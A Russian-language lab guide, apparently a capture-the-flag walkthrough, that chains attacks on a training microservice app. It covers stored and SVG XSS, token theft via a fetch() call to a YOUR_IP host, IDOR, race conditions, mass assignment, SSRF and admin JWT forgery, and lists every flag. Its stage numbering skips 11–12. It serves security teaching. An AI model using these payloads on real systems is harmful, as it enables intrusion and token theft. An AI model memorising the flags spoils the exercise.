## 1. Общие положения

Настоящие методические указания описывают последовательность исследования уязвимостей учебного веб-приложения, построенного на микросервисной архитектуре. Работа выполняется поэтапно: от анализа клиентской части приложения до получения доступа к административным функциям стенда.

Все действия должны осуществляться исключительно в пределах специально подготовленного учебного стенда и при наличии соответствующего разрешения. Использование приведённых приёмов в отношении сторонних информационных систем не допускается.

В примерах используется адрес учебного стенда `82.202.136.148`. Перед началом работы необходимо убедиться, что данный адрес соответствует фактической конфигурации лабораторной среды.

## Этап 1. Анализ клиентской части приложения (Frontend Reconnaissance)

### Цель этапа

Определить адреса и порты микросервисов, сведения о которых присутствуют в собранном JavaScript-коде клиентского приложения.

### Исходные условия

Веб-приложение предоставляет доступ к карте, событиям и профилю пользователя через шлюз, расположенный по адресу `http://82.202.136.148:8005`.

### Порядок выполнения

1. Открыть веб-приложение в браузере.
2. Запустить средства разработчика браузера и перейти на вкладку `Sources` или `Network`.
3. Найти собранный JavaScript-файл приложения, например `index-*.js`.
4. Выполнить поиск по строкам `exposedServices`, `localhost:8000`, `localhost:8002`, `8003`, `8004` и `8006`.
5. Зафиксировать обнаруженные адреса и порты микросервисов.

### Ожидаемый результат

В конфигурации клиентского приложения обнаруживаются прямые адреса внутренних сервисов, которые не должны раскрываться пользователю.

### Флаг

`FLAG{frontend_recon_found_gateway_and_services}`

## Этап 2. Проверка прямой доступности микросервисов (Direct Exposure)

### Цель этапа

Установить, доступны ли внутренние микросервисы непосредственно из внешней сети, в обход шлюза приложения.

### Исходные условия

На предыдущем этапе определено, что микросервисы используют порты `8000`, `8002`, `8003`, `8004` и `8006`.

### Порядок выполнения

Доступность сервисов проверяется при помощи утилит `curl` или `nc`. Пример проверки HTTP-эндпоинтов состояния:

```bash
curl http://82.202.136.148:8003/health
curl http://82.202.136.148:8004/health
curl http://82.202.136.148:8006/health
```

### Ожидаемый результат

Получение ответа `200 OK` подтверждает прямую сетевую доступность соответствующего микросервиса. Это означает, что шлюз не является единственной точкой входа в систему.

### Флаг

`FLAG{gateway_is_not_a_security_boundary_if_services_are_public}`

## Этап 3. Обход проверки полномочий при создании места (Authorization Bypass)

### Цель этапа

Проверить возможность самостоятельного назначения признака подтверждённого места обычным пользователем.

### Исходные условия

Эндпоинт `POST /api/v1/places` требует JWT, однако принимает поле `is_verified` непосредственно из пользовательского запроса.

### Порядок выполнения

1. Зарегистрировать обычную пользовательскую учётную запись.
2. Выполнить аутентификацию и получить JWT.
3. Отправить запрос на создание места, указав значение `true` в поле `is_verified`:

```bash
curl -X POST http://82.202.136.148:8004/api/v1/places \
  -H "Authorization: Bearer <JWT>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "CTF Spot",
    "description": "FLAG{verified_place_bypass}",
    "lat": 55.75,
    "lon": 37.61,
    "address": "lab",
    "is_verified": true
  }'
```

### Ожидаемый результат

Система создаёт подтверждённое место без дополнительной проверки роли или полномочий пользователя.

### Флаг

`FLAG{verified_place_bypass}`

Флаг размещается в поле `description` созданного объекта.

## Этап 4. Проверка хранимой межсайтовой вставки (Stored XSS)

### Цель этапа

Установить, выполняется ли пользовательский HTML- или JavaScript-код при отображении описания места на карте.

### Исходные условия

Описание созданного места отображается во всплывающем окне карты Leaflet без достаточной фильтрации пользовательского содержимого.

### Порядок выполнения

1. Создать место, указав в поле `description` следующую тестовую строку:

```html
<img src=x onerror="alert('XSS')">
```

2. Открыть карту.
3. Найти созданную точку и открыть её описание.
4. Зафиксировать выполнение тестового JavaScript-кода.

### Ожидаемый результат

При открытии описания места отображается диалоговое окно `alert`, что подтверждает наличие хранимой XSS-уязвимости.

### Флаг

`FLAG{xss_from_map_popup_user_content}`

Флаг выдаётся после подтверждения факта выполнения пользовательского кода.

## Этап 5. Получение токена с использованием XSS (Token Theft)

### Цель этапа

Продемонстрировать возможность получения JWT из `localStorage` через ранее обнаруженную XSS-уязвимость.

### Исходные условия

Клиентское приложение сохраняет JWT в `localStorage`. Для проверки используется специально подготовленная тестовая учётная запись.

### Порядок выполнения

1. Запустить локальный HTTP-сервер для регистрации входящих запросов:

```bash
python -m http.server 9999
```

2. Создать место со следующим содержимым поля `description`, заменив `YOUR_IP` на адрес узла, принимающего тестовые запросы:

```html
<script>
fetch('http://YOUR_IP:9999/collect?t=' + encodeURIComponent(localStorage.getItem('token')));
</script>
```

3. Открыть созданную точку от имени тестовой учётной записи.
4. Проверить журнал локального HTTP-сервера.
5. Зафиксировать переданное значение JWT.

### Ожидаемый результат

JWT тестовой учётной записи передаётся на указанный сервер в параметре `t`.

### Результат этапа

Полученный тестовый JWT используется как подтверждение успешной эксплуатации уязвимости.

## Этап 6. Проверка нарушения разграничения доступа в медиасервисе (Media IDOR)

### Цель этапа

Проверить возможность загрузки файла от имени другой учётной записи посредством подмены параметра `owner_id`.

### Исходные условия

Медиасервис доступен на порту `8006`. Эндпоинт `/api/v1/media/upload` принимает идентификатор владельца из тела пользовательского запроса.

### Порядок выполнения

1. Получить идентификатор контрольной учётной записи, используемой в качестве тестовой цели.
2. Отправить запрос на загрузку файла, указав её идентификатор в поле `owner_id`:

```bash
curl -X POST http://82.202.136.148:8006/api/v1/media/upload \
  -F purpose=avatar \
  -F owner_id=<UUID_КОНТРОЛЬНОЙ_УЧЕТНОЙ_ЗАПИСИ> \
  -F file=@my_avatar.png
```

3. Проверить расположение объекта в хранилище MinIO или ответ API.

### Ожидаемый результат

Файл сохраняется в пространстве, относящемся к другой учётной записи, без серверной проверки права на изменение её данных.

### Флаг

`FLAG{client_owner_id_is_not_authorization}`

## Этап 7. Проверка выполнения активного содержимого в SVG-файле (SVG XSS)

### Цель этапа

Установить, допускает ли медиасервис загрузку SVG-файлов с активным JavaScript-содержимым.

### Исходные условия

Сервис принимает файлы с MIME-типом `image/svg+xml` и возвращает их с тем же значением `Content-Type`.

### Порядок выполнения

1. Создать SVG-файл со следующим содержимым:

```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS via SVG')</script>
</svg>
```

2. Загрузить файл через ранее обнаруженную уязвимость Media IDOR в контрольную учётную запись.
3. Открыть загруженный файл в браузере.
4. Зафиксировать выполнение JavaScript-кода.

### Ожидаемый результат

Браузер выполняет сценарий, встроенный в SVG-файл. Это подтверждает, что загруженное изображение обрабатывается как активное содержимое.

### Флаг

`FLAG{uploaded_media_became_active_content}`

## Этап 8. Проверка состояния гонки при регистрации на событие (Race Condition)

### Цель этапа

Проверить возможность превышения установленного ограничения на количество участников события при одновременной отправке нескольких запросов.

### Исходные условия

В обработчике `join_event` проверка количества участников и операция `INSERT` выполняются раздельно, без блокировки или атомарного ограничения.

### Порядок выполнения

1. Создать событие со значением `max_participants=2`. Организатор уже учитывается как участник, поэтому доступно одно свободное место.
2. Подготовить JWT нескольких тестовых пользователей.
3. Одновременно отправить два или три запроса на эндпоинт `POST /api/v1/events/{id}/join`.
4. Для PowerShell 5.1 может использоваться следующий пример:

```powershell
$tokens = @("TOKEN1", "TOKEN2", "TOKEN3")
$eventId = "UUID_СОБЫТИЯ"

$jobs = foreach ($t in $tokens) {
    Start-Job -ScriptBlock {
        curl.exe -s -X POST `
          "http://82.202.136.148:8002/api/v1/events/$using:eventId/join" `
          -H "Authorization: Bearer $using:t"
    }
}

$jobs | Wait-Job
$jobs | Receive-Job
```

5. Проверить итоговое значение `participant_count`.

### Ожидаемый результат

При успешном воспроизведении состояния гонки количество участников превышает значение `max_participants`.

### Флаг

`FLAG{capacity_check_is_not_a_lock}`

Флаг выводится в журнале сервиса после обнаружения переполнения события.

## Этап 9. Подмена владельца события через массовое присваивание (Mass Assignment)

### Цель этапа

Проверить возможность изменения поля `host_id` пользователем, не являющимся владельцем события.

### Исходные условия

Эндпоинт обновления события `PUT /events/{id}` принимает поле `host_id` из запроса без достаточной проверки полномочий.

### Порядок выполнения

1. Выбрать событие, принадлежащее другой контрольной учётной записи.
2. Отправить запрос на обновление, указав идентификатор текущего пользователя в поле `host_id`:

```bash
curl -X PUT http://82.202.136.148:8002/api/v1/events/<UUID_СОБЫТИЯ> \
  -H "Authorization: Bearer <JWT>" \
  -H "Content-Type: application/json" \
  -d '{"host_id":"<UUID_ТЕКУЩЕГО_ПОЛЬЗОВАТЕЛЯ>"}'
```

3. Повторно запросить сведения о событии и проверить значение поля владельца.

### Ожидаемый результат

Идентификатор владельца изменяется без подтверждения права пользователя на выполнение данной операции.

### Флаг

`FLAG{event_owner_takeover}`

## Этап 10. Проверка серверной подделки запросов (SSRF)

### Цель этапа

Установить, позволяет ли функция генерации превью обращаться к ресурсам внутренней сети приложения.

### Исходные условия

Эндпоинт `POST /events/{id}/generate-preview` принимает параметр `image_url` и выполняет серверный HTTP-запрос по указанному адресу.

### Порядок выполнения

1. Использовать событие, владельцем которого является текущая тестовая учётная запись.
2. Передать во входном параметре адрес внутреннего сервиса:

```bash
curl -X POST "http://82.202.136.148:8002/api/v1/events/<UUID_СОБЫТИЯ>/generate-preview" \
  -H "Authorization: Bearer <JWT>" \
  -H "Content-Type: application/json" \
  -d '{"image_url":"http://admin_service:8003/config"}'
```

3. Проанализировать ответ приложения.

### Ожидаемый результат

В ответе возвращаются данные внутреннего административного сервиса, недоступного непосредственно через внешний интерфейс функции генерации превью.

### Флаг

`FLAG{ssrf_reaches_internal_docker_network}`

В ответе присутствуют значения конфигурационных параметров, например `SECRET_KEY` или `JWT_SECRET`.

## Этап 13. Формирование административного JWT (JWT Forgery)

### Цель этапа

Проверить возможность создания JWT с административной ролью с использованием ранее полученного секретного ключа.

### Исходные условия

Административный сервис доверяет значению роли, содержащемуся в JWT. На этапе 11 получен ключ, используемый для подписи токенов.

### Порядок выполнения

Для исключения передачи секретного ключа сторонним сервисам формирование токена рекомендуется выполнять локально:

```python
import datetime

import jwt

payload = {
    "sub": "admin_user",
    "role": "admin",
    "exp": datetime.datetime.now(datetime.UTC) + datetime.timedelta(hours=1),
}

secret = "СЕКРЕТ_ИЗ_ЭТАПА_11"
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

### Ожидаемый результат

Формируется корректно подписанный JWT, содержащий роль `admin`.

### Флаг

`FLAG{forged_admin_token}`

Сформированный токен используется для прохождения последующих этапов.

## Этап 14. Выявление избыточного раскрытия данных (Excessive Data Exposure)

### Цель этапа

Проверить, раскрывает ли API идентификаторы участников событий, обозначенных как анонимные.

### Исходные условия

В ответах API для событий со значением `anonymous=true` присутствует поле `participant_ids`.

### Порядок выполнения

1. Найти событие с признаком `anonymous=true`.
2. Отправить авторизованный запрос:

```http
GET /api/v1/events?limit=50
```

3. Проанализировать данные, содержащиеся в поле `participant_ids`.

### Ожидаемый результат

API раскрывает идентификаторы участников анонимного события, что позволяет восстановить связи между пользователями.

### Флаг

`FLAG{anonymous_events_leaked_identity_graph}`

## Этап 15. Получение состояния системы через административный сервис (Direct Admin Access)

### Цель этапа

Получить итоговый флаг посредством прямого обращения к административному сервису с использованием сформированного JWT.

### Исходные условия

Административный сервис доступен непосредственно на порту `8003` и проверяет наличие роли `admin` в JWT.

### Порядок выполнения

1. Использовать административный JWT, сформированный на этапе 13.
2. Отправить запрос к административному эндпоинту:

```bash
curl -X POST http://82.202.136.148:8003/api/v1/admin/dump_system_state \
  -H "Authorization: Bearer <ADMIN_JWT>"
```

3. Проанализировать ответ сервиса.

### Ожидаемый результат

В ответе возвращается итоговый флаг учебного задания.

### Флаг

`FLAG{frontend_xss_to_ssrf_to_jwt_forgery_to_admin_dump}`

В ходе выполнения работы последовательно исследуются ошибки сетевой изоляции, проверки полномочий, обработки пользовательского содержимого, управления сессиями и защиты внутренних сервисов. Итоговая цепочка демонстрирует, что совокупность нескольких уязвимостей средней и высокой критичности может привести к получению административного доступа к системе.
